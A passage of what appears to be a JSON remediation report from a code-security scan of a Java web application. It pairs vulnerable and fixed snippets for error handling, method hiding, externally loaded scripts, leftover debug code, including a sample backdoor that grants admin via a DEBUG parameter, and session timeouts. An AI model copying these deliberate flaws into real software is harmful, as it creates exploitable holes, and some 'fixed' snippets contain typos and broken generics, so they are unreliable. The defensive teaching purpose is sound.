(FileNotFoundException e)</em>\n          {\n\t     mv.setViewName(&quot;uploadFile&quot;);\n             mv.addObject(&quot;msg&quot;, &quot;You failed to upload &quot; + name + &quot; =&gt; &quot;);\n             return mv;\n          }  \n          <em class=\"blue\">cathc(IOException e)</em>\n\t  {\n             mv.setViewName(&quot;uploadFile&quot;);\n             mv.addObject(&quot;msg&quot;, &quot;You failed to upload &quot; + name + &quot; =&gt; &quot;);\n             return mv;\n          }\n\t  catch (Exception e) \n          {\n             mv.setViewName(&quot;uploadFile&quot;);\n             mv.addObject(&quot;msg&quot;, &quot;You failed to upload &quot; + name + &quot; =&gt; &quot;);\n             return mv;}\n          } \n  else {\n              mv.setViewName(&quot;uploadFile&quot;);\n              mv.addObject(&quot;msg&quot;, &quot;Only text files can be uploaded&quot;);\n              return mv;\n                 }\n        } else {\n               mv.setViewName(&quot;uploadFile&quot;);\n               mv.addObject(&quot;msg&quot;, &quot;You failed to upload because the file was empty.&quot;);\n               return mv;\n      }\n}", "comments": "In the sample code, handling different type of exception you can apply different logic for the application to recover or fail gracefully. \nFor generic exception you cannot do this.\nLet say, if SQLException is thrown you will add logic to log a ticket or send an e-mail to the support team to check the issue. \nWe can also customize our error message depending on the exception encountered (depending on Business Requirements and approvals).\nIn handling exception try to list all possible exception that are possible to be handled, and only generate a error (failure to treat the exception, generic exception catches) as a last resource.\n\nMake the application to fail safe, securely and gracefully. https://owasp.org/www-community/Fail_securely", "impact": "Determining business logic to treat all possible exceptions caught and align with the other teams how to handle / create tickets for exceptions on the code. \n\nE.g.: the DBA team will need to analyze the DB logs to understand if the Database server is overloaded with so many connections from the application, generating a SQLException, or if was a network issue... This scenario may lead to new strategies on the DB integration, but require attention from both teams).\n\nExceptions recorded on the logs needs to be checked by the application operations team.", "abstract": "By using as many as specific catch covering everything in code"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "System Information Leak: Incomplete Servlet Error Handling": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/FormServlet.java", "items": [{"id": "IN00448", "function": "Function: doGet()", "line": "71", "snippet": "@Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) {\n\t\n      try {"}]}, {"file": "src/com/accenture/sec/controller/FormServlet.java", "items": [{"id": "IN00449", "function": "Function: doPost()", "line": "37", "snippet": "@Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response)\n    \t\tthrows ServletException, IOException {"}]}], "remediation": {"remediation": {"@id": "R.0167", "@name": "System Information Leak: Incomplete Servlet Error Handling", "@dateLastModified": "12/13/2020", "faqs": {"faq": [{"question": "What can a attacker do with the stack trace information? There is no PII there!", "answer": "The attacker can get many information about the system with the stack traced, including the OS, Web Server, Language network properties, modules and framework in use. With this information the attacker can exploit known vulnerabilities in any of those if they exist."}, {"question": "what is the problem of catching all Exceptions on my method?", "answer": "This is a form of code quality issue. Do not catch broad exception classes like Exception, Throwable, Error, or except at the very top level of the program or thread (Because we are catching Exception object). The expectation for availability is that the application should recover or fail gracefully in case of exceptions, just the method will not work and it will still proceed with other parts of the application logic whenever possible.  Applications should only produce errors for unhandled exception types."}]}, "recommendations": {"recommendation": {"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">FormServlet.class\n\n</em>protected void doPost(HttpServletRequest request, HttpServletResponse response)\n    \t\t<em class=\"red\">throws ServletException, IOException</em> {\n \n        String height = request.getParameter(&quot;height&quot;);\n        String weight = request.getParameter(&quot;weight&quot;);\n \n            double bmi = calculateBMI(\n              Double.parseDouble(weight), \n              Double.parseDouble(height));\n            ......\n            dispatcher.forward(request, response);\n            response.sendRedirect(&quot;calculateStudentBMI.jsp&quot;);\n        \n    }", "nonvulncode": "<em class=\"bold\">FormServlet.class\n\n</em>protected void doPost(HttpServletRequest request, HttpServletResponse response)\n    \t\t{\n        String height = request.getParameter(&quot;height&quot;);\n        String weight = request.getParameter(&quot;weight&quot;);\n \n        try {\n            double bmi = calculateBMI(\n              Double.parseDouble(weight), \n              Double.parseDouble(height));\n          ....\n            RequestDispatcher dispatcher \n              = request.getRequestDispatcher(&quot;calculateStudentBMI.jsp&quot;);\n            dispatcher.forward(request, response);\n            response.sendRedirect(&quot;calculateStudentBMI.jsp&quot;);\n        } <em class=\"blue\">catch (Exception e) {\n        \tlogger.debug(&quot;Error is servlet post&quot;);\n        }</em>\n    }", "comments": "With exception handling, the program can gracefully exit and can show proper error messages, at the times of error, instead of leaking information or crashing system.", "impact": "No impact", "abstract": "Use of try/catch"}}, "mitigations": {"mitigation": [{"system": "Web Server / IIS", "configuration": "Web.config", "backend": "Configure the web server to use custom error pages instead of the default ones. \nThe custom error should be generic and do not expose any user, server or system information.\nreference: https://docs.microsoft.com/en-us/troubleshoot/aspnet/custom-error-reporting-page\nEx1:\nWeb.config\n    &lt;customErrors  mode=&quot;On&quot;&gt;\n      &lt;error statusCode=&quot;401&quot; redirect=&quot;/default.aspx&quot; /&gt;\n      &lt;error statusCode=&quot;402&quot; redirect=&quot;/default.aspx&quot; /&gt;\n      &lt;error statusCode=&quot;403&quot; redirect=&quot;/default.aspx&quot; /&gt;\n      &lt;error statusCode=&quot;500&quot; redirect=&quot;/default.aspx&quot; /&gt;\n    &lt;/customErrors&gt;\nEx2:\nWeb.config\n&lt;customErrors defaultRedirect=&quot;http://hostName/applicationName/errorStatus.htm&quot; mode=&quot;On&quot;&gt;\n&lt;/customErrors&gt;", "frontend": "&lt;default.aspx&gt;\nOps, this page contains an error that prevents the application to continue. Please try again.\n&lt;YYYY/MM/DD-HH24:MM:SS.sss-TMZ&gt;", "comments": "Create an error page that contains only a timestamp and a customized generic error message. \nFor throubleshoot, map errors on the log files with the timestamp, when needed.\n\nTo avoid re-ocurrence of this vulnerability after applying patches, or updates on the application/web server, it is recommended to:\n  Create test scripts and monitoring use cases to check if generic error message is set.\n  Configure the web server and make sure the same setting is applied to all application nodes (e.g., cluster, dockers, DDoS protection, multi-instances, cloud Elastic-IP,... )\n  Update installation scripts, configuration files, hardening guides, and Change Management documentation for the web server to ensure custom errors is always set."}, {"system": "WAF / ModSecurity", "configuration": "web.config\nInsert the below code, right after the &lt;/configSections&gt; in the web.config file of the web application.\n\n&lt;system.webServer&gt;\n    &lt;ModSecurity enabled=&quot;true&quot; configFile=&quot;C:\\Program Files\\ModSecurity IIS\\modsecurity_iis.conf&quot; /&gt;\n&lt;/system.webServer&gt;\n\nThe value of the configFile must be the path on where the ModSecurity installed.", "backend": "- OWASP CRS must be downloaded and enabled. \n- Rules for Data Leakages protection (must be present in the rules folder)\n   - RESPONSE-950-DATA-LEAKAGES.conf\n   - RESPONSE-952-DATA-LEAKAGES-JAVA.conf \n   - RESPONSE-953-DATA-LEAKAGES-PHP.conf \n   - RESPONSE-954-DATA-LEAKAGES-IIS.conf\n- Open the modsecurity.conf and update the SecRuleEngine to On.\n- Open the modsecurity_iis.conf and update the entry Include crs-setup.conf.example to Include crs-setup.conf", "frontend": "SIEM integration:\nWindows: Collect logs with Source as ModSecurity from eventviewer. Below is the log captured for SQL Injection.\n\n[client 10.0.1.163] ModSecurity: Warning. Matched phrase &quot;Stack trace:&quot; at RESPONSE_BODY. [file &quot;C:\\/Program Files/ModSecurity IIS/owasp_crs/rules/RESPONSE-953-DATA-LEAKAGES-PHP.conf&quot;] [line &quot;49&quot;] [id &quot;953100&quot;] [rev &quot;3&quot;] [msg &quot;PHP Information Leakage&quot;] [data &quot;Matched Data: Stack trace: found within  [severity &quot;ERROR&quot;] [ver &quot;OWASP_CRS/3.0.0&quot;] [maturity &quot;9&quot;] [accuracy &quot;9&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-php&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-disclosure&quot;] [tag &quot;OWASP_CRS/LEAKAGE/ERRORS_PHP&quot;] [tag &quot;WASCTC/WASC-13&quot;] [tag &quot;OWASP_TOP_10/A6&quot;] [tag &quot;PCI/6.5.6&quot;]\n\n[client 10.0.1.163] ModSecurity: Warning. Pattern match &quot;\\\\bServer Error in.{0,50}?\\\\bApplication\\\\b&quot; [severity &quot;ERROR&quot;] [ver &quot;OWASP_CRS/3.0.0&quot;] [maturity &quot;9&quot;] [accuracy &quot;9&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-iis&quot;] [tag &quot;platform-windows&quot;] [tag &quot;attack-disclosure&quot;] [tag &quot;OWASP_CRS/LEAKAGE/ERRORS_IIS&quot;] [tag &quot;WASCTC/WASC-1 [hostname &quot;EC2AMAZ-NVOOVOP&quot;] [uri &quot;/VulnApp_01/Employee/Employees?departmentId=3&param=0&quot;] [unique_id &quot;17582052951696872003&quot;]\n\n[client 10.0.1.163] ModSecurity: Warning. Pattern match &quot;(?:\\\\b(?:A(?:DODB\\\\.Command\\\\b.{0,100}?\\\\b(?:Application uses a value of the wrong type for the current operation\\\\b|error')| trappable error occurred in an external object\\\\. The script cannot continue running\\\\b)|Microsoft VBScript (?:compilation (?: ...&quot; [severity &quot;ERROR&quot;] [ver &quot;OWASP_CRS/3. [hostname &quot;EC2AMAZ-NVOOVOP&quot;] [uri &quot;/VulnApp_01/Employee/Employees?departmentId=3&param=0&quot;] [unique_id &quot;17582052951696872003&quot;]\n\n\nLinux:", "comments": "Use WAF as a defense in depth, adding another protection layer to sensitive applications when possible.\n\nWAF cannot be the only protection to prevent unhandled exception, adding GenericException handler or by handling exception in each method can avoid this issue\n\nFor ModSecurity, consider using OWASP Core Rule Set CRS https://coreruleset.org/documentation/"}]}}}}, "Build Misconfiguration: External Maven Dependency Repository": {"language": "JAVA", "files": [{"file": "pom.xml", "items": [{"id": "IN00453", "function": "//project/repositories()", "line": "411", "snippet": "</dependencies>\n<repositories>\n    <repository>\n      <id>Spring Repo</id>"}]}], "remediation": null}, "Code Correctness: Hidden Method": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00454", "function": "Function: executeQuery()", "line": "50", "snippet": "//vul 160 B2\n\tpublic static <T> List<T> executeQuery(Class<T> type,CriteriaQuery<T> cr,EntityManager em){\n\t\tlogger.debug(\"Inside EmployeeDAOImp class\");\n\t\tTypedQuery<T> query = em.createQuery(cr);"}]}], "remediation": {"remediation": {"@id": "R.0160", "@name": "Code Correctness: Hidden Method", "@dateLastModified": "12/13/2020", "faqs": {"faq": {"question": "Isn't overriding same as hidden methods", "answer": "No. If both methods are static, the child will hide the parent method."}}, "recommendations": {"recommendation": [{"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">CommonDAO.java</em>\n<em class=\"red\">public static &lt;T&gt; List&lt;T&gt; executeQuery</em>(Class&lt;T&gt; type,CriteriaQuery&lt;T&gt; cr,EntityManager em){\n\t\tlogger.debug(&quot;Inside CommonDAO class&quot;);\n\t\t\n\t\tTypedQuery&lt;T&gt; query = em.createQuery(cr);\n\t\tList&lt;T&gt; results = query.getResultList();\n\t\t\n\t\treturn results;\n\t}\n\n<em class=\"bold\">EmployeeDAOImpl.java extends CommonDAO class</em>\n\n<em class=\"red\">public static &lt;T&gt; List&lt;T&gt; executeQuery</em>(Class&lt;T&gt; type,CriteriaQuery&lt;T&gt; cr,EntityManager em){\n\t\tlogger.debug(&quot;Inside EmployeeDAOImp class&quot;);\n\t\tTypedQuery&lt;T&gt; query = em.createQuery(cr);\n\t\tList&lt;T&gt; results = query.getResultList();\n\t\t\n\t\treturn results;\n\t}\n\npublic Map&lt;Integer, String&gt; getDepartmentMap() throws Exception{\n\t\t\n\t\tMap&lt;Integer, String&gt; departmentMap = new HashMap&lt;Integer, String&gt;();\n\t\t\n\t\tEntityManager em=entityManagerFactory.createEntityManager();\n\t\t\n\t\ttry {\n\t\t\tCriteriaBuilder cb = em.getCriteriaBuilder();\n\t\t\tCriteriaQuery&lt;DepartmentEntity&gt; cr = cb.createQuery(DepartmentEntity.class);\n\t\t\tRoot&lt;DepartmentEntity&gt; root = cr.from(DepartmentEntity.class);\n\t\t\tcr.select(root);\n\n\t\t\t<em class=\"red\">List&lt;DepartmentEntity&gt; results = executeQuery(DepartmentEntity.class,cr,em);</em>\n\n\t\t\tIterator&lt;DepartmentEntity&gt; it = results.iterator();\n\t\t\twhile (it.hasNext()) {\n\t\t\t\tDepartmentEntity dept = it.next();\n\t\t\t\tdepartmentMap.put(dept.getId(), dept.getName());\n\t\t\t}\n\t\t} catch(Exception e) {\n\t\t\tthrow e;\n\t\t}\t\t\t\t\t\n\t\treturn departmentMap;\n\t}", "nonvulncode": "<em class=\"bold\">CommonDAO.java</em>\npublic static &lt;T&gt; List&lt;T&gt; executeQuery(Class&lt;T&gt; type,CriteriaQuery&lt;T&gt; cr,EntityManager em){\n\t\tlogger.debug(&quot;Inside CommonDAO class&quot;);\n\t\t\n\t\tTypedQuery&lt;T&gt; query = em.createQuery(cr);\n\t\tList&lt;T&gt; results = query.getResultList();\n\t\t\n\t\treturn results;\n\t}\n\n<em class=\"bold\">EmployeeDAOImpl.java extends CommonDAO class</em>\n\npublic static &lt;T&gt; List&lt;T&gt; executeQuery(Class&lt;T&gt; type,CriteriaQuery&lt;T&gt; cr,EntityManager em){\n\t\tlogger.debug(&quot;Inside EmployeeDAOImp class&quot;);\n\t\tTypedQuery&lt;T&gt; query = em.createQuery(cr);\n\t\tList&lt;T&gt; results = query.getResultList();\n\t\t\n\t\treturn results;\n\t}\n\npublic Map&lt;Integer, String&gt; getDepartmentMap() throws Exception{\n\t\t\n\t\tMap&lt;Integer, String&gt; departmentMap = new HashMap&lt;Integer, String&gt;();\n\t\t\n\t\tEntityManager em=entityManagerFactory.createEntityManager();\n\t\t\n\t\ttry {\n\t\t\tCriteriaBuilder cb = em.getCriteriaBuilder();\n\t\t\tCriteriaQuery&lt;DepartmentEntity&gt; cr = cb.createQuery(DepartmentEntity.class);\n\t\t\tRoot&lt;DepartmentEntity&gt; root = cr.from(DepartmentEntity.class);\n\t\t\tcr.select(root);\n\n\t\t\tList&lt;DepartmentEntity&gt; results = <em class=\"blue\">CommonDAO.executeQuery(DepartmentEntity.class,cr,em);</em>\n\n\t\t\tIterator&lt;DepartmentEntity&gt; it = results.iterator();\n\t\t\twhile (it.hasNext()) {\n\t\t\t\tDepartmentEntity dept = it.next();\n\t\t\t\tdepartmentMap.put(dept.getId(), dept.getName());\n\t\t\t}\n\t\t} catch(Exception e) {\n\t\t\tthrow e;\n\t\t}\t\t\t\t\t\n\t\treturn departmentMap;\n\t}", "comments": "In the vulnerable code, the sub class has a static method with the same name of the parents class method (there is no overload as those are static methods). \nBy accessing the static method without providing the classname to be invoked, the application will execute the static method in the subclass, since the parent static method was &quot;hidden&quot; by the sub class having same static method name. \n\nIt is recommended in this case to explicitly add the static method to be used (parent of child). It is advised to call the method with class names which avoids confusion/misleading.", "impact": "No impact", "abstract": "Use of specific class during method call"}, {"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">CommonDAO.java</em>\n<em class=\"red\">public static &lt;T&gt; List&lt;T&gt; executeQuery</em>(Class&lt;T&gt; type,CriteriaQuery&lt;T&gt; cr,EntityManager em){\n\t\tlogger.debug(&quot;Inside CommonDAO class&quot;);\n\t\t\n\t\tTypedQuery&lt;T&gt; query = em.createQuery(cr);\n\t\tList&lt;T&gt; results = query.getResultList();\n\t\t\n\t\treturn results;\n\t}\n\n<em class=\"bold\">EmployeeDAOImpl.java extends CommonDAO class</em>\n\n<em class=\"red\">public static &lt;T&gt; List&lt;T&gt; executeQuery</em>(Class&lt;T&gt; type,CriteriaQuery&lt;T&gt; cr,EntityManager em){\n\t\tlogger.debug(&quot;Inside EmployeeDAOImp class&quot;);\n\t\tTypedQuery&lt;T&gt; query = em.createQuery(cr);\n\t\tList&lt;T&gt; results = query.getResultList();\n\t\t\n\t\treturn results;\n\t}\n\npublic Map&lt;Integer, String&gt; getDepartmentMap() throws Exception{\n\t\t\n\t\tMap&lt;Integer, String&gt; departmentMap = new HashMap&lt;Integer, String&gt;();\n\t\t\n\t\tEntityManager em=entityManagerFactory.createEntityManager();\n\t\t\n\t\ttry {\n\t\t\tCriteriaBuilder cb = em.getCriteriaBuilder();\n\t\t\tCriteriaQuery&lt;DepartmentEntity&gt; cr = cb.createQuery(DepartmentEntity.class);\n\t\t\tRoot&lt;DepartmentEntity&gt; root = cr.from(DepartmentEntity.class);\n\t\t\tcr.select(root);\n\n\t\t\t<em class=\"red\">List&lt;DepartmentEntity&gt; results = executeQuery(DepartmentEntity.class,cr,em);</em>\n\n\t\t\tIterator&lt;DepartmentEntity&gt; it = results.iterator();\n\t\t\twhile (it.hasNext()) {\n\t\t\t\tDepartmentEntity dept = it.next();\n\t\t\t\tdepartmentMap.put(dept.getId(), dept.getName());\n\t\t\t}\n\t\t} catch(Exception e) {\n\t\t\tthrow e;\n\t\t}\t\t\t\t\t\n\t\treturn departmentMap;\n\t}", "nonvulncode": "<em class=\"bold\">CommonDAO.java</em>\n<em class=\"blue\">public List&lt;T&gt;</em> executeQuery(Class&lt;T&gt; type,CriteriaQuery&lt;T&gt; cr,EntityManager em){\n\t\tlogger.debug(&quot;Inside CommonDAO class&quot;);\n\t\t\n\t\tTypedQuery&lt;T&gt; query = em.createQuery(cr);\n\t\tList&lt;T&gt; results = query.getResultList();\n\t\t\n\t\treturn results;\n\t}\n\n<em class=\"bold\">EmployeeDAOImpl.java extends CommonDAO class</em>\n\n<em class=\"blue\">@Override</em>\n<em class=\"blue\">public List&lt;T&gt; e</em>xecuteQuery(Class&lt;T&gt; type,CriteriaQuery&lt;T&gt; cr,EntityManager em){\n\t\tlogger.debug(&quot;Inside EmployeeDAOImp class&quot;);\n\t\tTypedQuery&lt;T&gt; query = em.createQuery(cr);\n\t\tList&lt;T&gt; results = query.getResultList();\n\t\t\n\t\treturn results;\n\t}\n\npublic Map&lt;Integer, String&gt; getDepartmentMap() throws Exception{\n\t\t\n\t\tMap&lt;Integer, String&gt; departmentMap = new HashMap&lt;Integer, String&gt;();\n\t\t\n\t\tEntityManager em=entityManagerFactory.createEntityManager();\n\t\t\n\t\ttry {\n\t\t\tCriteriaBuilder cb = em.getCriteriaBuilder();\n\t\t\tCriteriaQuery&lt;DepartmentEntity&gt; cr = cb.createQuery(DepartmentEntity.class);\n\t\t\tRoot&lt;DepartmentEntity&gt; root = cr.from(DepartmentEntity.class);\n\t\t\tcr.select(root);\n\n\t\t\tList&lt;DepartmentEntity&gt; results = <em class=\"blue\">executeQuery(DepartmentEntity.class,cr,em);\n\n\t\t\tIterator&lt;DepartmentEntity&gt; it = results.iterator();\n\t\t\twhile (it.hasNext()) {\n\t\t\t\tDepartmentEntity dept = it.next();\n\t\t\t\tdepartmentMap.put(dept.getId(), dept.getName());\n\t\t\t}\n\t\t} catch(Exception e) {\n\t\t\tthrow e;\n\t\t}\t\t\t\t\t\n\t\treturn departmentMap;\n\t}</em>", "comments": "In the vulnerable code, the sub class has a static method with the same name of the parents class method (there is no overload as those are static methods). \n\nBy accessing the static method without providing the classname to be invoked, the application will execute the static method in the subclass, since the parent static method was &quot;hidden&quot; by the sub class having same static method name. \n\nAnother approach to overcome misleading hidden methods is to define the class as non static and explicitly override in sub class when required.", "impact": "Use of Override", "abstract": null}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Hardcoded Domain in HTML": {"language": "JAVA", "files": [{"file": "WebContent/WEB-INF/jspViews/listUser.jsp", "items": [{"id": "IN00456", "function": "null()", "line": "36", "snippet": "</div>\n    <div id=\"WeatherWidget\">\n<script type=\"text/javascript\" src=\"http://code.jquery.com/jquery-2.1.0.min.js\"></script>\n</div>\n</body>"}]}], "remediation": {"remediation": {"@id": "R.0033", "@name": "Hardcoded Domain in HTML", "@dateLastModified": "11/19/2020", "faqs": {"faq": {"question": "Why is it a problem to download the java script? It will be in cache anyway, so no major impact on performance.", "answer": "Referencing a javascript from a domain will create a security risk to the application. Incase the domain was compromise, they can alter the script that your application is using and possibly steal some confidential data or break the functionality of the application."}}, "recommendations": {"recommendation": [{"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">listUser.jsp</em>\n\n&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=ISO-8859-1&quot;\n    pageEncoding=&quot;ISO-8859-1&quot;%&gt;\n&lt;%@taglib prefix=&quot;form&quot; uri=&quot;http://www.springframework.org/tags/form&quot; %&gt;\n&lt;%@taglib prefix=&quot;e&quot; uri=&quot;http://www.springframework.org/tags&quot; %&gt;\n&lt;%@ taglib prefix=&quot;c&quot; uri=&quot;http://java.sun.com/jsp/jstl/core&quot;%&gt;\n&lt;link href=&quot;&lt;c:url value=&quot;/resources/css/style.css&quot;/&gt;&quot; rel=&quot;stylesheet&quot;&gt;\n<em class=\"red\">&lt;script src=&quot;http://code.jquery.com/jquery-2.1.0.min.js&quot;&gt;&lt;/script&gt;</em>\n...", "nonvulncode": "<em class=\"bold\">listUser.jsp</em>\n\n&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=ISO-8859-1&quot;\n    pageEncoding=&quot;ISO-8859-1&quot;%&gt;\n&lt;%@taglib prefix=&quot;form&quot; uri=&quot;http://www.springframework.org/tags/form&quot; %&gt;\n&lt;%@taglib prefix=&quot;e&quot; uri=&quot;http://www.springframework.org/tags&quot; %&gt;\n&lt;%@ taglib prefix=&quot;c&quot; uri=&quot;http://java.sun.com/jsp/jstl/core&quot;%&gt;\n&lt;link href=&quot;&lt;c:url value=&quot;/resources/css/style.css&quot;/&gt;&quot; rel=&quot;stylesheet&quot;&gt;\n<em class=\"blue\">&lt;script type=&quot;text/javascript&quot; src=&quot;js/jquery-2.1.0.min.js&quot;&gt;&lt;/script&gt;\n.....</em>", "comments": "Including a script from another domain will create security risk to the application. \nIt is advised to download a local copy (artifact), check the hash (e.g. SHA, MD5) of all downloaded libraries, and host those in the application itself.\nA repository manager (https://maven.apache.org/repository-management.html) and process must be in place to have the digital inventory updated and to update the libraries when needed.", "impact": "No impact", "abstract": "Host the script in your application"}, {"@type": ".NET/C#/ASP", "vulncode": "&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;meta charset=&quot;utf-8&quot; /&gt;\n    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\n    &lt;title&gt;@ViewBag.Title - My ASP.NET Application&lt;/title&gt;\n    @Styles.Render(&quot;~/Content/css&quot;)\n    @Scripts.Render(&quot;~/bundles/modernizr&quot;)\n  <em class=\"red\">  &lt;script src=&quot;http://code.jquery.com/jquery-2.1.0.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;</em>\n&lt;/head&gt;\n&lt;body&gt;\n..\n&lt;/body&gt;\n&lt;/html&gt;", "nonvulncode": "&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;meta charset=&quot;utf-8&quot; /&gt;\n    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\n    &lt;title&gt;@ViewBag.Title - My ASP.NET Application&lt;/title&gt;\n    @Styles.Render(&quot;~/Content/css&quot;)\n    @Scripts.Render(&quot;~/bundles/modernizr&quot;)\n    <em class=\"blue\">&lt;script src=&quot;~/Scripts/jquery-2.1.0.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;</em>\n&lt;/head&gt;\n&lt;body&gt;\n...\n&lt;/body&gt;\n&lt;/html&gt;", "comments": "Including a script from another domain will create security risk to the application. It is advised to download a local copy (artifact), check the hash (e.g. SHA, MD5) of all downloaded libraries, and host those in the application itself.\nA repository manager (e.g., nuget, Sonatype Nessus pro, etc.) and process must be in place to have the digital inventory updated and to update the libraries when needed.", "impact": "No impact", "abstract": "Host the script in your application"}]}, "mitigations": {"mitigation": [{"system": "Artifact Repository", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Configure the artifact repository to host a local copy of all external libraries used by the application.\nApplications should limit the imports to the artifact repository only, and not rely on the external ones.\n\nSee reference: \nJfrog Artifactory: https://www.jfrog.com/confluence/display/JFROG/Onboarding+Best+Practices%3A+JFrog+Artifactory\nNexus Repo: https://www.sonatype.com/nexus/repository-oss"}, {"system": "Maven / Gradle / nuget", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Configure to downlaod and include the external libraries used by the application.\nReference: \nhttps://stackoverflow.com/questions/8233978/how-do-i-install-jquery-into-my-web-app-using-maven\nhttps://kill3.wordpress.com/2008/06/10/managing-javascript-libraries-as-maven-war-overlays/\nhttps://arghya.xyz/articles/nexus-artifact-repository-for-dotnet/"}]}}}}, "J2EE Bad Practices: JVM Termination": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00459", "function": "exit()", "line": "868", "snippet": "} catch (Exception e) {\n\t\t\tlogger.error(\"Error in deleting file\", e.getMessage());\n\t\t\tSystem.exit(99);\n\t\t}"}]}], "remediation": null}, "J2EE Bad Practices: Leftover Debug Code": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00460", "function": "Function: main()", "line": "97", "snippet": "LoginDAO dao;\n\t\n\tpublic static void main(String[] args) {\n\t\tlogger.debug(\"Entered main user with username and password\"+args[0]);\n\t\ttry {"}]}], "remediation": {"remediation": {"@id": "R.0142", "@name": "J2EE Bad Practices: Leftover Debug Code", "@dateLastModified": "11/13/2020", "faqs": {"faq": {"question": "Why main() are a security issue?", "answer": "The existence of main() in many classes is an indirect indicative of backdoors the developer left on the code to test the application. If they exist, it is advised to manually search for other conditions that are used to test the application (e.g., shortcuts to go to a specific state on the state machine; special tags to instantiate a speciffic class; parameters that can test specific functionalities, etc.)"}}, "recommendations": {"recommendation": {"@type": "JAVA/JSP", "vulncode": "class LoginControllerTest{\n...\n<em class=\"red\">public static void main(String[] args) {\n\t\tlogger.debug(&quot;Entered main user with username and password&quot;+args[0]);\n\u2026.\n\t}\n</em>\u2026\n}", "nonvulncode": "//LoginControllerTest class and any other backdoor removed", "comments": "The security tools detect class with static void main(String[] args) method as an indirect issue for debug code left in the software. \nNote: If the method is present in the main Spring class, remediation is not required (Spring requires a main () and an entry point).\n\nIf there are test classes on the code, those should be removed before submitting to be  scanned by the security team, and of course, reaching production.\nThere are other types of backdoors that are not dependent of the existence of a main(), for example:\n\nprivate void authenticate(final HttpServletRequest request) {\n    final String userName = request.getParameter(&quot;username&quot;);\n    final String password = request.getParameter(&quot;password&quot;);\n\n<em class=\"red\">    int isDebug = Integer.parseInt(request.getParameter(&quot;DEBUG&quot;));</em>\n    final HttpSession session = request.getSession(true);\n\n<em class=\"red\">    // For debugging tests only. Remove later. -&gt; It is on the comments ...But forgot to remove.\n    if (isDebug == 1) {\n        session.setAttribute(&quot;isAdmin&quot;, true);\n        loginDebug(session);\n    } else\n</em>        login(userName, password, session);\n}\n\nIn this example of a parameter to go directly to test a functionality, the URL with specific parameters (isDebug) is considered a security backdoor and even if not detected by the security tools, it must be removed before reaching production. \nOther examples (not complete list) that must be removed before deploying the code to production: \n   shortcuts to go to a specific state on the state machine (e.g., <em class=\"red\">http://url.com/adduser?checkout=DEBUG</em>  -&gt; used to test by going directly to the checkout method, without user logged in or having items on the chart)\n   Tag to enable more messages (e.g., <em class=\"red\">http://url.com/adduser?debug=ON</em>  -&gt; enable debug messages when creating an user); \n   special tags to instantiate a speciffic class (e.g., <em class=\"red\">http://url.com/viewcart=DEBUG</em> -&gt; to insdtantiate the cart class); \n   parameters that can test specific functionalities (e.g., <em class=\"red\">http://url.com/adduser?checkout=DEBUG</em>  -&gt; used to test by going directly to the checkout method, without user logged in or having items on the chart); \n   special roles or usernames used to test scenario (e.g., <em class=\"red\">http://url.com/login?user=DEBUG_ADMIN</em> -&gt; special hardcoded backdoor user) ;", "impact": "No impact for the production. \nDeveloper need to remove any functional backdoor created during development phases.", "abstract": "Backdoors removed"}}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "J2EE Misconfiguration: Excessive Session Timeout": {"language": "JAVA", "files": [{"file": "WebContent/WEB-INF/web.xml", "items": [{"id": "IN00462", "function": "null()", "line": "74", "snippet": "</servlet>\n   \n<session-config>\n<session-timeout>-1</session-timeout>\n    <cookie-config>"}]}], "remediation": {"remediation": {"@id": "R.0122", "@name": "J2EE Misconfiguration: Excessive Session Timeout", "@dateLastModified": "1/19/2021", "faqs": {"faq": {"question": "But the business requirement is to have the session timeout set to much longer than security is recommending.", "answer": "There are ways to enforce security without impacting the user experience. Refer to the business requirements and the client's security policies for the specific value for session timeout, and get an agreement from both teams if this application is an exception to the session tiomout police and how it is protected."}}, "recommendations": {"recommendation": [{"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">web.xml</em>\n&lt;session-config&gt;\n<em class=\"red\">&lt;session-timeout&gt;-1&lt;/session-timeout&gt;</em>\n    &lt;cookie-config&gt;\n        